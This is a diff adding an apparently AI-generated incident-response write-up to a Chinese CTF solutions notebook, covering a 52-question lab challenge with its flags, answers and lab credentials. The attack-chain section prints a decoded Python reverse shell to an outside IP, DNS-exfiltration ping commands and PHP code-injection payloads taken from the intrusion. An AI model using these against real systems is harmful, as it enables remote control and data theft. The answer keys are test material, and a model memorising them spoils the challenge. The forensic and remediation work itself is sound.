@@ -3,10 +3,10 @@ AIGC:
   ContentProducer: '001191110102MAD55U9H0F10002'
   ContentPropagator: '001191110102MAD55U9H0F10002'
   Label: '1'
-  ProduceID: 'a6f73e30-0d99-41f3-94a6-b8643f77caf6'
-  PropagateID: 'a6f73e30-0d99-41f3-94a6-b8643f77caf6'
-  ReservedCode1: 'fc6a0e3b-c0b2-41a6-b4b0-435ab10c3e8f'
-  ReservedCode2: 'fc6a0e3b-c0b2-41a6-b4b0-435ab10c3e8f'
+  ProduceID: '683aafe8-5d0a-4c2c-9556-0b1cd405a69a'
+  PropagateID: '683aafe8-5d0a-4c2c-9556-0b1cd405a69a'
+  ReservedCode1: '16ce3149-e3cf-49c3-87f6-2e995717d00f'
+  ReservedCode2: '16ce3149-e3cf-49c3-87f6-2e995717d00f'
 ---
 
 # CTF 解题笔记本
@@ -45,21 +45,24 @@ AIGC:
 | 25 | IR | Windows Web应急响应 | IP:`192.168.126.1` 账户:`hack168$` 密码:`rebeyond` 矿池:`wakuang.zhigongshanfang.top` | [win_web_ir.py](IR/21-win-web-ir/win_web_ir.py) |
 | 26 | IR | Linux Web应急响应 (PHPEMS考试系统) | IP:`192.168.20.131` 密码:`Network@2020` flag1:`flag1{Network@_2020_Hack}` flag2:`flag{bL5Frin6...}` flag3:`flag{5LourqoF...}` | [linux_web_ir2.py](IR/22-linux-web-ir2/linux_web_ir2.py) |
 | 27 | IR | Windows挖矿应急响应 (c3pool) | IP:`192.168.115.131` 时间:`2024-05-21 20:25:22` 端口:`3389` 矿池:`auto.c3pool.org` 钱包:`4APXVhuk...` | — |
+| 28 | PWN | testpwn (Warm Up) SSL+ret2text | `CTF2{a4ff3bcb...}` | [pwn_arcanum.py](PWN/pwn-arcanum/pwn_arcanum.py) |
+| 29 | IR | 帕鲁杯应急响应挑战赛 (52子题) | 5个FLAG已验证 | — |
 
 ## 统计
 
-- **总题数**：27
+- **总题数**：29（含1道综合IR实战赛题，内含52道子题）
 - **Web**：8 题（PHP 5 + Flask 1 + SQL 1 + 流量分析 1）
-- **PWN**：4 题（栈溢出 Ret2Text 系列 + Ret2Shellcode + 堆溢出 Fastbin）
+- **PWN**：5 题（栈溢出 Ret2Text 系列 + Ret2Shellcode + 堆溢出 Fastbin + SSL远程利用）
 - **Crypto**：5 题（RSA + 维吉尼亚密码 + 生僻字拼音 + 仿射密码 + 多层编码）
 - **Reverse**：4 题（Java / Python / ELF / PE）
-- **IR（应急响应）**：5 题（Webshell 流量分析 + 自动化流量取证工具 + Redis未授权访问 + Windows Web应急响应 + Linux Web应急响应PHPEMS）
+- **IR（应急响应）**：7 题（Webshell 流量分析 + 自动化流量取证工具 + Redis未授权访问 + Windows Web应急响应 + Linux Web应急响应PHPEMS + Windows挖矿c3pool + 帕鲁杯多组件综合IR实战）
 - **IDA Pro 9.3** 用于 PWN 和 Reverse 题目的反编译分析
 - **capstone** 用于 stripped ELF 的线性反汇编（PWN 第22题）
 - **scapy + pycryptodome** 用于 IR 流量分析和加密通信解码
 - **paramiko** 用于 IR 远程SSH连接靶机排查（第24题起）
 - **pyinstxtractor + uncompyle6** 用于 PyInstaller 打包的 Python exe 逆向（第25题）
 - **MD5 + pcap strings** 用于 Linux Web IR 取证（第26题）
+- **SafeLine WAF API + JumpServer审计 + Zabbix数据库审计** 用于帕鲁杯多组件IR取证（第29题）
 
 ---
 
@@ -5117,6 +5120,281 @@ timeout: the monitored command dumped core
 
 - PWN Arcanum v1.3：`PWN/pwn-arcanum/pwn_arcanum.py`
 - 一键复现：`python pwn_arcanum.py testpwn --remote HOST:PORT --ssl --no-interactive`
+
+> AI生成
+
+---
+
+
+## 第29题：帕鲁杯应急响应挑战赛 — 多组件综合IR实战
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | IR - 多组件综合应急响应（Web+数据库+堡垒机+监控+办公区） |
+| 赛事 | 第一届帕鲁杯CTF应急响应挑战赛 |
+| 承办 | 知攻善防实验室 + One-Fox安全团队 |
+| 目标网段 | 192.168.20.0/24 |
+| 完成日期 | 2026-08-03 |
+| 总题数 | 52道子题（含5个FLAG验证） |
+
+### 资产清单
+
+| 区域 | 服务器名称 | IP地址 | 系统登录信息 | 应用/服务 |
+|------|-----------|--------|-------------|----------|
+| DMZ区 | WEB Server | 192.168.20.121 | home/home1234!!! | Discuz! X3.5, Spring Boot(8080) |
+| DMZ区 | WAF Server | 192.168.20.123 | home/home1234!!! | SafeLine WAF 5.2.0 (9443) |
+| 安全运维区 | JumpServer | 192.168.20.11 | - | JumpServer v3.10.6 (8080) |
+| 安全运维区 | Zabbix Server | 192.168.20.12 | home/home1234!!! | Zabbix (通过WAF 9002端口) |
+| 数据存储区 | MYSQL Server 1 | 192.168.20.51 | mysql/mysql1234!!! | MySQL (3306) - palu_ctf, ultrax |
+| 数据存储区 | MYSQL Server 2 | 192.168.20.52 | mysql/mysql1234!!! | MySQL (3306) - zabbix |
+| 办公区 | PC01 | 192.168.20.201 | Administrator/Network@2020 | Windows |
+| 办公区 | PC02 | 192.168.20.202 | Administrator/Network@2020 | Windows |
+
+**WAF管理界面**: https://192.168.20.123:9443/ （admin / mQzm7LqF）
+
+**JumpServer**: http://192.168.20.123:8080 （admin / Network@2020）
+
+**WAF保护的4个站点**:
+
+| 站点 | WAF端口 | 后端地址 |
+|------|---------|---------|
+| WebServer | 80 | http://192.168.20.121/ |
+| JumpServer | 8080 | http://192.168.20.11 |
+| Zabbix | 9002 | http://192.168.20.12/ |
+| FastJson | 7878 | http://192.168.20.121:8080/ |
+
+### 全部题目与FLAG/答案
+
+#### 签到 / 基础排查
+
+| # | 题目 | 答案 | 来源 |
+|---|------|------|------|
+| 1 | 堡垒机中flag标签的值 | **BrYeaVj54009rDIZzu4O** | JumpServer标签列表 |
+| 2 | 攻击者第一次登录时间 | **2024/04/11/14:21:18** | JumpServer登录日志 |
+| 3 | 攻击者源IP | **192.168.1.4** | JumpServer审计日志 |
+| 4 | 攻击者使用的CVE编号 | **CVE-2024-29201** | JumpServer漏洞利用 |
+| 5 | Web服务器上恶意程序的32位小写MD5 | **84413332e4e7138adc5d6f1f688ddd69** | WebServer恶意文件md5sum |
+| 6 | 恶意程序连接地址和密码 | 连接: 待排查 / 密码: 待排查 | pyc反编译 |
+| 7 | 存在反序列化漏洞的端口 | **8080** | WAF攻击记录筛选 |
+| 8 | 攻击者使用的后门路由地址 | **/api/system** | WAF筛选路径api |
+| 9 | dnslog反弹域名 | **0vqkht.palu.cn** | WebServer log.txt |
+| 10 | 第一次扫描器使用时间 | 待排查 | WAF攻击记录 |
+| 11 | 攻击者反弹shell使用的语言 | **python** | Zabbix脚本分析 |
+| 12 | 攻击者反弹shell的IP | **82.157.238.174** | Zabbix脚本审计 |
+| 13 | 攻击者留下的账号 | **hacktest** | WebServer /etc/passwd |
+| 14 | 攻击者的后门账户密码 | **123123** | /etc/shadow john爆破 |
+| 15 | 测试数据条数 | **5** | 数据库 |
+| 16 | 攻击者留下的信息 | **flag{hi_palu_f10g}** | 日志中发现hacktest |
+| 17 | 运维服务器上的恶意文件MD5小写32 | 待排查 | Zabbix Server文件 |
+| 18 | 恶意文件的恶意函数 | **begingame** | IDA逆向helloworld |
+| 19 | 攻击者恶意注册的恶意用户条数 | **10** | Discuz kongzi系列用户 |
+| 20 | 对博客系统的第一次扫描时间 | 待排查 | WAF记录 |
+| 21 | 攻击者下载的文件 | **upload.zip** | WebServer访问日志 |
+| 22 | 攻击者第一次下载的时间 | **16/Apr/2024:09:03:52** | WebServer访问日志 |
+| 23 | 攻击者留下的冰蝎马的文件名称 | **nidewen.php** | WebServer html/api目录 |
+| 24 | 冰蝎的链接密码 | **1be873048db838ac** (nidewen) | 冰蝎马内容 |
+| 25 | 办公区存在的恶意用户名 | **hacker** | PC01 net user |
+| 26 | 恶意用户密码到期时间 | 待排查 | PC01 net user |
+| 27 | 内存疑似恶意进程 | **hack.ex** | PC01 volatility pslist |
+| 28 | 员工使用的公司OA平台密码 | **liuling7541** | PC01内存取证 |
+| 29 | 木马文件名 | **h4ck3d!** | PC01剪贴板 |
+| 30 | 重要联系人的家庭住址 | **秋水省雁荡市碧波区千屿山庄1号** | PC01联系人 |
+| 31 | 近源靶机上的恶意文件哈希 | **a7fcd0b15a080167c4c2f05063802a6e** | PC02 artifact.exe |
+| 32 | 恶意程序的外联地址 | **101.78.63.44** | PC02沙箱分析 |
+| 33 | 攻击者使用内网扫描工具的哈希 | 待排查 | PC02 fscan |
+| 34 | 攻击者在站点上留下的后门密码 | **123** | WAF站点 |
+| 35 | 攻击者在数据库留下的信息 | **flag{hack_palu}** | MySQL ultrax.pre_ucenter_vars |
+| 36 | 监控服务器上dcnlog地址 | **palu.dcnlog.cn** | Zabbix脚本 |
+| 37 | 监控服务器上恶意用户的上一次登录时间 | 待排查 | Zabbix用户 |
+| 38 | 监控服务器上遗留的反弹shell地址和端口 | **154.183.110.12:7890** | Zabbix脚本base |
+| 39 | 恶意钓鱼文件的哈希 | 待排查 | JumpServer上传日志 |
+| 40 | 恶意文件外联IP | 待排查 | PC02 |
+| 41 | 被恶意文件钓鱼使用者的姓名 | **陈琚鹭** | JumpServer会话监控 |
+| 42 | 攻击者留下的信息 | 待排查 (注册表字符串) | PC02注册表 |
+| 43 | 恶意用户数量 | **49** | PC02 net user |
+| 44 | 员工集体使用的密码 | **Network@2020** | PC02 |
+| 45 | 加密文件的哈希 | 待排查 | PC02 encode.txt |
+| 46 | 被攻击者加密的内容明文 | **2024ispassword** | 玛卡巴卡解密 |
+| 47 | 符合基线标准的服务器数量 | **md5(0)** | 基线检查 |
+| 48 | 办公区的恶意文件哈希 | 待排查 | PC01 palucomeyi1.exe |
+| 49 | 恶意回连端口 | **22** | PC01恶意程序 |
+| 50 | 恶意程序中的flag | **flag{234567uyhgn_aiduyai}** | pyc反编译 |
+| 51 | 恶意文件中的search_for_text内容 | **passwod** | pyc反编译 |
+| 52 | Web服务器上攻击者修改后的root密码 | 待排查 (john爆破shadow) | WebServer /etc/shadow |
+
+#### 实际环境验证发现的FLAG
+
+| FLAG | 来源 | 说明 |
+|------|------|------|
+| **BrYeaVj54009rDIZzu4O** | JumpServer标签列表 | 名称=flag, 值=BrYeaVj54009rDIZzu4O |
+| **flag{hack_palu}** | MySQL Server 1 ultrax.pre_ucenter_vars | name字段 |
+| **flag{hi_palu_f10g}** | WebServer日志 hacktest | 攻击者留下 |
+| **flag{234567uyhgn_aiduyai}** | PC01恶意程序pyc | SSH上传恶意程序 |
+| **CVE-2024-29201** | JumpServer漏洞 | 攻击者利用的CVE |
+
+### 攻击链还原
+
+#### Phase 1: Web应用攻击 (2024-04-17 08:59)
+- **攻击者IP**: 192.168.20.121 (WebServer自身，可能是被控后的横向扫描)
+- **攻击方式**: 大规模自动化扫描 (181条WAF记录)
+  - SQL注入 (m_sqli)
+  - PHP代码注入 (m_php_code_injection)
+  - PHP反序列化 (m_php_unserialize)
+  - 文件包含 (m_file_include)
+  - 命令注入 (m_cmd_injection)
+- **WAF状态**: 全部拦截 (action=1)
+
+#### Phase 2: PHP代码注入攻击 (2024-04-17 10:21)
+- **攻击者IP**: 192.168.20.77
+- **攻击方式**: PHP代码注入
+  - `/?123=system("ls");` - 列目录
+  - `/?123=system("cat admin.php");` - 读取admin文件
+- **时间**: 2024-04-17 10:21:13 ~ 10:22:04
+- **WAF状态**: 全部拦截
+
+#### Phase 3: Zabbix后门植入
+- **恶意用户**: palu (UserID: 3, Name: palu palu)
+- **恶意脚本**:
+
+| 脚本名 | ID | 命令 | 用途 |
+|--------|-----|------|------|
+| hack | 4 | `ping user.\`whoami\`.palu.dcnlog.cn` | DNS外带 - 获取当前用户名 |
+| hack1 | 5 | `ping user.\`python3\`.palu.dcnlog.cn` | DNS外带 - 确认python3可用 |
+| hack2/base | 6 | 反向Shell到 154.183.110.12:7890 (后改为 82.157.238.174:7890) | 远程控制 |
+
+- **base脚本解码**:
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("154.183.110.12",7890))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("sh")
+```
+
+- **DNS外带域名**: palu.dcnlog.cn
+
+#### Phase 4: JumpServer横向移动
+- **攻击者IP**: 192.168.1.4 (通过JumpServer外部连接)
+- **时间线**:
+  - 2024-04-17 12:49 - MySQL连接 (MysqlDatabase01/02)
+  - 2024-04-17 12:54 - Zabbix SSH连接 (home账号, 10条命令, 21分钟)
+  - 2024-04-17 12:54 - Zabbix SFTP文件传输
+  - 2024-04-17 13:05-14:58 - MySQL数据库操作 (查询zabbix数据库表)
+  - 2024-04-17 14:13-15:05 - PC02 RDP连接 (26+9条命令, 约78分钟)
+  - 攻击者在PC02上执行: `net user`, `cmd`, `md5`, `encode`等命令
+  - 攻击者在MySQL上执行: SELECT查询zabbix数据库多张表
+
+### 关键证据
+
+**WAF攻击记录 (SafeLine WAF)**:
+- 总记录数 7535条
+- API路径: /api/open/auth/csrf (GET) -> /api/open/auth/login (POST)
+- 攻击记录API: /api/open/records
+- 主要攻击类型: m_sqli / m_php_code_injection / m_cmd_injection / m_file_include / m_php_unserialize / m_xss / m_scanner
+
+**Zabbix恶意脚本证据 (MySQL Server 2)**:
+```sql
+-- 恶意用户
+SELECT * FROM zabbix.users WHERE username='palu';
+-- userid=3, username=palu, name=palu, surname=palu
+
+-- 恶意脚本
+SELECT scriptid, name, command FROM zabbix.scripts WHERE name IN ('hack','hack1','base');
+-- scriptid=4, name=hack, command=ping user.`whoami`.palu.dcnlog.cn
+-- scriptid=5, name=hack1, command=ping user.`python3`.palu.dcnlog.cn
+-- scriptid=6, name=base, command=<base64 encoded reverse shell>
+
+-- 审计日志
+SELECT clock, action, details FROM zabbix.auditlog WHERE username LIKE '%palu%';
+-- 2024-04-17 13:29~13:33: palu用户登录、创建恶意脚本、更新用户权限
+```
+
+**Discuz数据库被篡改 (MySQL Server 1)**:
+```sql
+SELECT * FROM ultrax.pre_ucenter_vars WHERE name LIKE '%flag%';
+-- name=flag{hack_palu}, value=0
+```
+
+**Discuz用户信息**:
+
+| 用户名 | 邮箱 |
+|--------|------|
+| admin | admin@admin.com |
+| kongzi (x10) | kongzi@palu.com |
+| paluhome | palu@palu.com |
+| helloctf | helloctf@palu.com |
+
+**JumpServer审计记录**:
+- 2837条命令记录
+- 13条历史会话记录
+- 攻击者从 192.168.1.4 通过JumpServer操作了Pc02(RDP)、MySQL、Zabbix(SSH/SFTP)
+
+### 攻击者信息汇总
+
+| 项目 | 信息 |
+|------|------|
+| 攻击者IP (Web层) | 192.168.20.77 |
+| 攻击者IP (内网扫描) | 192.168.20.121 |
+| 攻击者IP (JumpServer) | 192.168.1.4 |
+| DNS外带域名 | palu.dcnlog.cn / 0vqkht.palu.cn |
+| 反向Shell C2 #1 | 154.183.110.12:7890 |
+| 反向Shell C2 #2 | 82.157.238.174:7890 |
+| PC02恶意程序外联IP | 101.78.63.44 |
+| Zabbix后门用户 | palu |
+| 最早攻击时间 | 2024-04-17 08:59:31 |
+| 攻击者CVE | CVE-2024-29201 (JumpServer) |
+| 数据库植入flag | flag{hack_palu} |
+| 冰蝎马文件 | nidewen.php |
+| 冰蝎链接密码 | 1be873048db838ac (nidewen) |
+| 后门路由 | /api/system |
+| WebServer后门账号 | hacktest / 123123 |
+| PC01恶意用户 | hacker |
+| PC02恶意用户数量 | 49个 |
+| 钓鱼受害者 | 陈琚鹭 |
+| 加密文件明文 | 2024ispassword (玛卡巴卡解密) |
+| 反弹Shell语言 | Python |
+
+### 排查方法论
+
+1. **主机存活探测**: nmap/masscan扫描192.168.20.0/24
+2. **端口扫描**: 22个常见端口扫描
+3. **Web指纹识别**: 访问HTTP服务识别Discuz/JumpServer等
+4. **数据库弱口令**: 直接MySQL root连接
+5. **WAF登录分析**: 通过SafeLine WAF API获取攻击记录
+6. **Zabbix数据库审计**: 查看scripts/users/auditlog表
+7. **JumpServer审计**: 查看历史会话和命令记录
+8. **Discuz数据库审计**: 查看异常数据植入
+
+### 修复建议
+
+1. **修改所有弱口令**: home/home1234!!!, mysql/mysql1234!!!, admin/mQzm7LqF, Network@2020
+2. **清除Zabbix恶意用户和脚本**: 删除palu用户及hack/hack1/base脚本
+3. **阻断C2通信**: 防火墙封禁154.183.110.12、82.157.238.174、101.78.63.44
+4. **清除DNS外带**: 封禁palu.dcnlog.cn和0vqkht.palu.cn域名解析
+5. **清除WebServer冰蝎马**: 删除/var/www/html/api/nidewen.php
+6. **清除WebServer后门账号**: 删除hacktest用户，修改root密码
+7. **修复JumpServer漏洞**: 升级修复CVE-2024-29201
+8. **清除Spring Boot后门路由**: 移除/api/system
+9. **清除Discuz恶意数据**: 清除ultrax.pre_ucenter_vars中的flag{hack_palu}
+10. **清除PC01恶意用户**: 删除hacker用户，清理hack.ex进程和palucomeyi1.exe
+11. **清除PC02恶意用户**: 清理49个非正常用户，删除artifact.exe
+12. **解密并恢复PC02文件**: encode.txt已用玛卡巴卡加密，明文为2024ispassword
+13. **加强JumpServer访问控制**: 限制外部IP 192.168.1.4的访问
+
+### 知识点
+
+1. **多组件IR排查方法论**: WAF日志分析 → 数据库审计 → 堡垒机审计 → 主机取证，四类证据源交叉验证还原完整攻击链
+2. **JumpServer审计**: 会话记录 + 命令记录 + SFTP文件传输记录三件套，是内网横向移动取证的黄金来源
+3. **Zabbix脚本后门**: 利用Zabbix自定义脚本功能植入DNS外带和反弹Shell，容易被忽略
+4. **DNS外带检测**: `ping user.\`whoami\`.domain` 模式是经典DNS隧道，检查Zabbix脚本和网络日志
+5. **冰蝎马识别**: 文件名常见伪装（如nidewen.php），内容含固定AES密钥特征
+6. **内存取证**: Volatility pslist/volshell/clipboard联合使用，可提取内存进程、剪贴板内容
+7. **JumpServer漏洞利用**: CVE-2024-29201 为JumpServer越权漏洞，可导致未授权会话访问
 
 > AI生成
 
